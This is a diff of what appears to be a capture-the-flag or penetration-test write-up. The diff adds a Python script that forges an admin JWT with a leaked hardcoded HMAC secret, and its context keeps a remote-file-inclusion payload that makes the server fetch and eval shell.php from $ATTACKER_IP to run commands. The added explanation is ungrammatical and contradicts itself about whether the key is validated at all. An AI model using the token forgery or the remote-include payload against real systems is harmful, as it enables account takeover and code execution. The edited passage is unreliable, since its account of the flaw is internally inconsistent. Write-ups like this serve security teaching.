@@ -68,9 +68,26 @@ Requesting a session JWT and decoding it showed a predictable structure:
 ```json
 {"sub":"robert.wilson","role":"user","iat":1788866255,"exp":1788869855}
 ```
+```import jwt
+import time
 
-Critically, this token **decoded correctly using the same key recovered from `app.js` in Stage
-2** — the application reused its hardcoded secret as the **JWT signing key** (HS256). Since I
+payload = {
+    "sub": "laura.hayes",
+    "role": "admin",
+    "iat": int(time.time()),
+    "exp": int(time.time()) + 3600
+}
+
+secret = "N3xusK3y2024!!"
+
+token = jwt.encode(payload, secret, algorithm="HS256")
+print(token)
+```
+
+Critically, this token **I tried to decode it with the same key obtained earlier from `app.js` in Stage
+2 because it is the only key I had it worked. Later I found that the any key would have worked because
+the piece of code that validates the key was commented out so the key were never being validated** — 
+the application reused its hardcoded secret as the **JWT signing key** (HS256). Since I
 had that secret, I could write a Python script to **sign my own token from scratch**, setting
 `"role":"admin"` and any username I chose, and the server would trust it because the signature
 validates against the leaked key. This is a **forged/self-signed JWT via leaked HMAC secret** —
@@ -131,7 +148,7 @@ name=http://$ATTACKER_IP:8000/shell.php&cmd=id
 ```
 
 The server fetched my file, `eval()`'d it as real PHP, and executed `id` as the web server user
-(`www-data`) — full **arbitrary command execution**.
+— full **arbitrary command execution**.
 
 ## Stage 8 — Post-Exploitation: Cronjob to Root
 From the RCE shell, I found the `devops` password stored in a config file — pivoting to that
